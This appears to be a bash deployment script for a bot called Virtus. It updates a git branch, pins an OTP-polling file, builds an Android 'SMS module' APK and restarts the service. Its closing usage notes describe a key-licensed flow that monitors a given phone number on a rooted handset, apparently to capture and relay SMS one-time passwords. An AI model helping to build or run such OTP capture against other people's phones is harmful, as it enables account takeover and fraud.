#!/usr/bin/env bash
# Safe VPS update: OTP + channel + inject bot logic UNTOUCHED, UI/autostop/mynum + fresh APK.
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"
ENV_FILE="$ROOT/.env"

BRANCH="${VPS_BRANCH:-cursor/inject-resume-fix-8042}"
OTP_STABLE="${OTP_STABLE_COMMIT:-d07c0d2}"

echo "==> Virtus safe update (branch: $BRANCH)"
echo "    OTP poll locked to commit: $OTP_STABLE"
echo "    channel_relay.py + inject queue = branch as-is (no extra patches)"

if [ -f "$ENV_FILE" ]; then
  set -a
  # shellcheck disable=SC1090
  source "$ENV_FILE"
  set +a
fi

echo "==> git fetch + checkout"
git fetch origin "$BRANCH"
git checkout "$BRANCH"
git pull origin "$BRANCH"

echo "==> lock working OTP poll (firebase_sms_sync.py)"
git checkout "$OTP_STABLE" -- app/firebase_sms_sync.py

echo "==> python deps"
pip install -q -r requirements.txt

echo "==> build APK (Astik core + base-e3797 config DB)"
export APK_CONFIG_DB="${APK_CONFIG_DB:-https://base-e3797-default-rtdb.firebaseio.com}"
export DEFAULT_CONFIG_DB="$APK_CONFIG_DB"
(cd apk && bash build-apk.sh)

echo "==> restart bot"
restarted=0
for svc in sms-monitor virtus-bot virtus; do
  if systemctl list-unit-files "${svc}.service" 2>/dev/null | grep -q "${svc}.service"; then
    sudo systemctl restart "${svc}"
    echo "  restarted ${svc}"
    restarted=1
    break
  fi
done
if [ "$restarted" -eq 0 ]; then
  echo "  WARN: no systemd service found — start bot manually"
fi

sleep 2
echo "==> health"
curl -sf "http://127.0.0.1:${PORT:-8000}/health" | python3 -m json.tool || true

BASE="${PUBLIC_BASE_URL:-http://127.0.0.1:${PORT:-8000}}"
APK_LOCAL="$ROOT/apk/virtus-sms-module.apk"

echo ""
echo "=========================================="
echo " DONE — OTP / channel / inject bot = safe"
echo "=========================================="
echo "APK install (phone pe naya module):"
echo "  ${BASE%/}/download/apk"
echo "  file: $APK_LOCAL"
echo ""
echo "Bot flow:"
echo "  /key KEY-XXXX  →  /a device  →  /mynum phone  →  /startmonitor"
echo "  15 min baad stop → /startmonitor dubara"
echo "  APK: START SERVICE ON + same KEY + root"
echo ""
